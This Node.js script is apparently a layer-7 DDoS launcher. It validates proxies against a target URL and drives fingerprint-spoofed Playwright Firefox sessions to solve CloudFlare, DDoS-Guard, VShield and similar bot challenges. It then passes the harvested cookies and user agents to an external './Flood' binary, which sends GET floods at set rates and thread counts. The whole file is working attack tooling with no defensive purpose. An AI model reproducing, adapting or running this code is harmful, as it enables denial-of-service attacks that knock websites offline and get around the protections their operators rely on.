require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const {
   firefox
} = require('playwright-extra');

const colors = require('colors');
const url = require('url');
const fs = require('fs');
const request = require("request");

const parsedArgs = require('minimist')(process.argv.slice(2));

const {
   spawn
} = require('child_process');

const {
   UAParser
} = require('ua-parser-js');

const {
   FingerprintGenerator
} = require('./fingerprint-generator/index.js');
const {
   FingerprintInjector
} = require('./fingerprint-injector/index.js');

process.on('uncaughtException', function(er) {
   // console.log(er);
});
process.on('unhandledRejection', function(er) {
   // console.log(er);
});

const susDetection = {
   "js": [{
         "name": "GameSense",
         "navigations": 1,
         "locate": "<title>GameSense</title>"
      },
      {
         "name": "StackPath",
         "navigations": 1,
         "locate": 'function genPid()'
      }, {
         "name": "CloudFlare",
         "navigations": 2,
         "locate": "<h2 class=\"h2\" id=\"challenge-running\">"
      }, {
         "name": "React",
         "navigations": 1,
         "locate": "Check your browser..."
      }, {
         "name": "DDoS-Guard",
         "navigations": 1,
         "locate": "DDoS protection by DDos-Guard"
      }, {
         "name": "CF-UAM",
         "navigations": 1,
         "locate": "<title>Just a moment...</title>"
      }, {
         "name": "VShield",
         "navigations": 1,
         "locate": `<script src="https://fw.vshield.pro/v2/bot-detector.js"></script>`
      }, {
         "name": "BALOO",
         "navigations": 1,
         "locate": "<center><h1>Please Enable JS</h1></center>"
      }
   ]

}
const validProxies = [];

const urlT = process.argv[2];
const timeT = process.argv[3];
const sessT = process.argv[4];

const rate = parsedArgs["rate"] || '64';
const threads = parsedArgs["threads"] || '100';

if (process.argv.length < 5) {
   console.log(`[38;2;5;189;245m~[38;2;18;180;241m>[38;2;31;171;237m [38;2;44;162;233mW[38;2;57;153;229mr[38;2;70;144;225mo[38;2;83;135;221mn[38;2;96;126;217mg[38;2;109;117;213m [38;2;122;108;209mu[38;2;135;99;205ms[38;2;148;90;201ma[38;2;161;81;197mg[38;2;174;72;193me[38;2;187;63;189m![38;2;200;54;185m
[38;2;5;189;245m
[38;2;5;189;245m~[38;2;7;187;245m>[38;2;9;185;245m [38;2;11;183;245mn[38;2;13;181;245mo[38;2;15;179;245md[38;2;17;177;245me[38;2;19;175;245m [38;2;21;173;245mr[38;2;23;171;245mu[38;2;25;169;245mn[38;2;27;167;245m.[38;2;29;165;245mj[38;2;31;163;245ms[38;2;33;161;245m [38;2;35;159;245m[[38;2;37;157;245mT[38;2;39;155;245ma[38;2;41;153;245mr[38;2;43;151;245mg[38;2;45;149;245me[38;2;47;147;245mt[38;2;49;145;245m][38;2;51;143;245m [38;2;53;141;245m[[38;2;55;139;245mT[38;2;57;137;245mi[38;2;59;135;245mm[38;2;61;133;245me[38;2;63;131;245m][38;2;65;129;245m [38;2;67;127;245m[[38;2;69;125;245mS[38;2;71;123;245me[38;2;73;121;245ms[38;2;75;119;245ms[38;2;77;117;245mi[38;2;79;115;245mo[38;2;81;113;245mn[38;2;83;111;245ms[38;2;85;109;245m][38;2;87;107;245m [38;2;89;105;245m-[38;2;91;103;245m-[38;2;93;101;245mr[38;2;95;99;245ma[38;2;97;97;245mt[38;2;99;95;245me[38;2;101;93;245m=[38;2;103;91;245m([38;2;105;89;245mR[38;2;107;87;245mA[38;2;109;85;245mT[38;2;111;83;245mE[38;2;113;81;245m)[38;2;115;79;245m [38;2;117;77;245m-[38;2;119;75;245m-[38;2;121;73;245mt[38;2;123;71;245mh[38;2;125;69;245mr[38;2;127;67;245me[38;2;129;65;245ma[38;2;131;63;245md[38;2;133;61;245ms[38;2;135;59;245m=[38;2;137;57;245m([38;2;139;55;245mT[38;2;141;53;245mH[38;2;143;51;245mR[38;2;145;49;245mE[38;2;147;47;245mA[38;2;149;45;245mD[38;2;151;43;245mS[38;2;153;41;245m)[0;00m`);
   process.exit(0);
}

const proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');


function randPrx() {
   return proxies[Math.floor(Math.random() * proxies.length)];
}

function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
}

function cookiesToStr(cookies) {
   if (Array.isArray(cookies)) {
      return cookies.reduce((prev, {
         name,
         value
      }) => {
         if (!prev) return `${name}=${value}`;
         return `${prev}; ${name}=${value}`;
      }, "");
      return "";
   }
}

var UAs = [
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
]

function findJs(argument) {
   for (let i = 0; i < susDetection['js'].length; i++) {
      if (argument.includes(susDetection['js'][i].locate)) {
         return susDetection['js'][i]
      }
   }
}

function solverInstance(args) {
   return new Promise((resolve, reject) => {
      const fingerprintGenerator = new FingerprintGenerator();
      const browserFingerprintWithHeaders = fingerprintGenerator.getFingerprint({
         devices: ['desktop'],
         browsers: [{
            name: 'firefox',
            minVersion: 104
         }],
         operatingSystems: ['linux'],
      });

      const fingerprintInjector = new FingerprintInjector();
      const {
         fingerprint
      } = browserFingerprintWithHeaders;
      const useragns = fingerprint.navigator.userAgent;
      const locale = fingerprint.navigator.language;

      firefox.launch({
         proxy: {
            server: 'http://' + args.Proxy
         },
         args: [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--renderer-process-limit=1',
            '--mute-audio',
            '--disable-setuid-sandbox',
            '--enable-webgl',
            '--ignore-certificate-errors',
            '--use-gl=disabled',
            '--color-scheme=dark',
            '--user-agent=' + useragns,
         ],
         ignoreDefaultArgs: [
            '--enable-automation'
         ],

         headless: false,
         javaScriptEnabled: true,
         ignoreHTTPSErrors: true,
      }).then(async (browser) => {
         console.log(`[38;2;5;189;245m~[38;2;17;180;241m>[38;2;29;171;237m [38;2;41;162;233mL[38;2;53;153;229ma[38;2;65;144;225mu[38;2;77;135;221mn[38;2;89;126;217mc[38;2;101;117;213mh[38;2;113;108;209m:[38;2;125;99;205m [38;2;137;90;201m[[38;2;149;81;197m [38;2;161;72;193m${args.Proxy}[38;2;173;63;189m [38;2;185;54;185m][38;2;197;45;181m`)

         const context = await browser.newContext({
            userAgent: useragns,
            locale: fingerprint.navigator.language,
            viewport: fingerprint.screen
         });
         await fingerprintInjector.attachFingerprintToPlaywright(context, browserFingerprintWithHeaders);

         const parser = new UAParser();
         parser.setUA(useragns);
         const result = parser.getResult();

         await context.addInitScript(args => {
            (function() {
               const ua = useragns;
               const os = args.os;

               const userAgentData = Object.create(NavigatorUAData.prototype)

               Object.defineProperty(userAgentData, 'mobile', {
                  get: function() {
                     return false
                  }
               })
               Object.defineProperty(userAgentData, 'platform', {
                  get: function() {
                     return os.name
                  }
               })

               NavigatorUAData.prototype.getHighEntropyValues = function(hints) {
                  if (hints.length == 0)
                     return {}

                  let hint = {
                     brands,
                     mobile: false,
                     platform: os.name,
                  }

                  const getters = {
                     architecture: function() {
                        return {
                           architecture: 'x86'
                        }
                     },
                     bitness: function() {
                        return {
                           bitness: '64'
                        }
                     },
                     model: function() {
                        return ''
                     },
                     platformVersion: function() {
                        return {
                           platform: os.name,
                           platformVersion: os.version
                        }
                     },
                     uaFullVersion: function() {
                        return {
                           uaFullVersion: ua.version
                        }
                     },
                     fullVersionList: function() {
                        return {
                           fullVersionList: this.brands
                        }
                     }
                  }

                  for (let h in hints) {
                     if (getters[hints[h]] != null)
                        Object.assign(hint, getters[hints[h]]())
                  }
                  return hint
               }
               Object.defineProperty(window.navigator, 'userAgentData', {
                  get: function() {
                     return userAgentData
                  }
               });
            })()
         }, {
            ua: result.browser,
            os: result.os
         });

         await context.addInitScript(() => {
            Object.defineProperty(navigator, 'pdfViewerEnabled', {
               get: () => 'true',
            });
         });

         await context.addInitScript(() => {
            ['height', 'width'].forEach(property => {
               const imageDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, property);
               Object.defineProperty(HTMLImageElement.prototype, property, {
                  ...imageDescriptor,
                  get: function() {
                     if (this.complete && this.naturalHeight == 0) {
                        return 20;
                     }
                     return imageDescriptor.get.apply(this);
                  },
               });
            });
         });

         await context.addInitScript(() => {
            Object.defineProperty(window.Notification, 'permission', {
               get: () => 'granted',
            });
         });

         var headers;
         var page;

         try {
            page = await context.newPage({
               userAgent: useragns,
               locale: fingerprint.navigator.language,
               viewport: fingerprint.screen,
               deviceScaleFactor: 1
            })
            await page.setDefaultNavigationTimeout(0);

            await context.on('page', (page) => {
               page.emulateMedia({
                  colorScheme: 'dark'
               }).catch(() => {});
            });
            await page.setViewportSize({
               width: fingerprint.screen.width,
               height: fingerprint.screen.height
            })

            await page.on('response', resp => {
               headers = resp.request().headers();
//               console.log(headers)
            });

            await page.route('***', route => route.continue());
            await page.goto(args.Target)
         } catch (e) {
            await browser.close();
            reject(e);
         }

         const source = await page.content();
         const JS = await findJs(source);


         if (JS) {
            if (JS.name == "VShield") {

               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.down();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.up();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.down();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.up();
               await page.keyboard.press('Enter');
               await page.keyboard.press('1');
               await page.keyboard.press('R');

            }

            for (let i = 0; i < JS.navigations; i++) {
               var [response] = await Promise.all([
                  page.waitForNavigation({
                     waitUntil: 'domcontentloaded',
                     timeout: 15000
                  }),
               ])
            }
         } else {}

         const source2 = await page.content();
         const JS2 = await findJs(source2);


         if (JS2) {
            if (JS2.name == "VShield") {

               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.down();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.up();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.down();
               await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
               await page.mouse.up();
               await page.keyboard.press('Enter');
               await page.keyboard.press('1');
               await page.keyboard.press('R');
            }

            for (let i = 0; i < JS2.navigations; i++) {
               var [response] = await Promise.all([
                  page.waitForNavigation({
                     waitUntil: 'domcontentloaded',
                     timeout: 15000
                  }),
               ])
            }
         };

         const cookies = cookiesToStr(await page.context().cookies());
         const titleParsed = await page.title();
         if (titleParsed == "405 Not Allowed") {
            await browser.close();
            reject(`pizda`);
         };

         console.log(`[38;2;5;189;245m~[38;2;21;177;240m>[38;2;37;165;235m [38;2;53;153;230mC[38;2;69;141;225mo[38;2;85;129;220mo[38;2;101;117;215mk[38;2;117;105;210mi[38;2;133;93;205me[38;2;149;81;200m:[38;2;165;69;195m [38;2;181;57;190m${cookies}[38;2;197;45;185m`)
         console.log(`[38;2;5;189;245m~[38;2;23;176;239m>[38;2;41;163;233m [38;2;59;150;227mT[38;2;77;137;221mi[38;2;95;124;215mt[38;2;113;111;209ml[38;2;131;98;203me[38;2;149;85;197m:[38;2;167;72;191m [38;2;185;59;185m${titleParsed}[38;2;203;46;179m`)

         await page.screenshot({
            path: 'bxvtest2.png'
         });

         var object = {
            ua: useragns,
            proxy: args.Proxy,
            cookie: cookies,
            headers: headers
         }
         await browser.close();
         resolve(object);
      })
   })
}

var checking = true;

function
shuffle(array) {
   let currentIndex = array.length,
      randomIndex;
   // While there remain elements to shuffle.
   while (currentIndex != 0) {
      // Pick a remaining element.
      randomIndex = Math.floor(Math.random() * currentIndex);
      currentIndex--;
      // And swap it with the current element.
      [array[currentIndex], array[randomIndex]] = [
         array[randomIndex], array[currentIndex]
      ];
   }
   return array;
};

function check_proxy(proxy) {
   if (checking === false || validProxies.length > 300) return;

   request({
      url: urlT,
      proxy: "http://" + proxy,
      headers: {
         'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0",
      },
      time: true
   }, (err, res, body) => {
      if (!err) {
         if (checking === false || validProxies.length > 300) return;
         validProxies.push(proxy);
      }
   });
}

let domain = url.parse(urlT).hostname;

async function sessionIn() {
   for (var i = 0; i < sessT; i++) {
      solverInstance({
         "Target": urlT,
         "Proxy": validProxies[i],
         "ua": 'LARAVEL<3'
      }).then(async (data, _) => {
         const ls = spawn('./Flood', ["mode=GET", "url=" + urlT, "domain=" + domain, "limit=" + rate, "time=" + "100", "good=" + data.proxy, "threads=" + threads, "cookie=" + data.cookie, "user_agent=" + data.ua, "rand_query=" + ""]);
      })
   }
}

async function reloadSess() {
   solverInstance({
      "Target": urlT,
      "Proxy": validProxies[Math.floor(Math.random() * validProxies.length)],
      "ua": 'LARAVEL<3'
   }).then(async (data, _) => {
      const ls = spawn('./Flood', ["mode=GET", "url=" + urlT, "domain=" + domain, "limit=" + rate, "time=" + "100", "good=" + data.proxy, "threads=" + threads, "cookie=" + data.cookie, "user_agent=" + data.ua, "rand_query=" + ""]);
   })
}

function main() {
   shuffle(proxies).forEach((e) => {
      check_proxy(e);
   })

   var sec = 3;
   console.log(`[38;2;5;189;245m~[38;2;77;137;221m>[38;2;149;85;197m [0;00m[38;2;5;189;245mC[38;2;12;184;243mh[38;2;19;179;241me[38;2;26;174;239mc[38;2;33;169;237mk[38;2;40;164;235mi[38;2;47;159;233mn[38;2;54;154;231mg[38;2;61;149;229m [38;2;68;144;227mt[38;2;75;139;225mh[38;2;82;134;223me[38;2;89;129;221m [38;2;96;124;219mp[38;2;103;119;217mo[38;2;110;114;215mo[38;2;117;109;213ml[38;2;124;104;211m [38;2;131;99;209mf[38;2;138;94;207mo[38;2;145;89;205mr[38;2;152;84;203m [38;2;159;79;201mv[38;2;166;74;199ma[38;2;173;69;197ml[38;2;180;64;195mi[38;2;187;59;193md[38;2;194;54;191mi[38;2;201;49;189mt[38;2;208;44;187my`)

   var checkingProxies = setInterval(() => {
      sec -= 1;
      if (sec == 0) {
         console.clear();
         console.log(`[38;2;5;189;245m~[38;2;77;137;221m>[38;2;149;85;197m [0;00m[38;2;5;189;245mL[38;2;13;184;243ma[38;2;21;179;241mu[38;2;29;174;239mn[38;2;37;169;237mc[38;2;45;164;235mh[38;2;53;159;233mi[38;2;61;154;231mn[38;2;69;149;229mg[38;2;77;144;227m [38;2;85;139;225mb[38;2;93;134;223mr[38;2;101;129;221mo[38;2;109;124;219mw[38;2;117;119;217ms[38;2;125;114;215me[38;2;133;109;213mr[38;2;141;104;211m [38;2;149;99;209ms[38;2;157;94;207me[38;2;165;89;205ms[38;2;173;84;203ms[38;2;181;79;201mi[38;2;189;74;199mo[38;2;197;69;197mn[38;2;205;64;195ms[38;2;213;59;193m.[0;00m`)

         checking = false;

         clearInterval(checkingProxies);

         return sessionIn();
      }
   }, 1000);
}

main();

setTimeout(() => {
   process.exit(0);
   process.exit(0);
   process.exit(0);
}, timeT * 1000)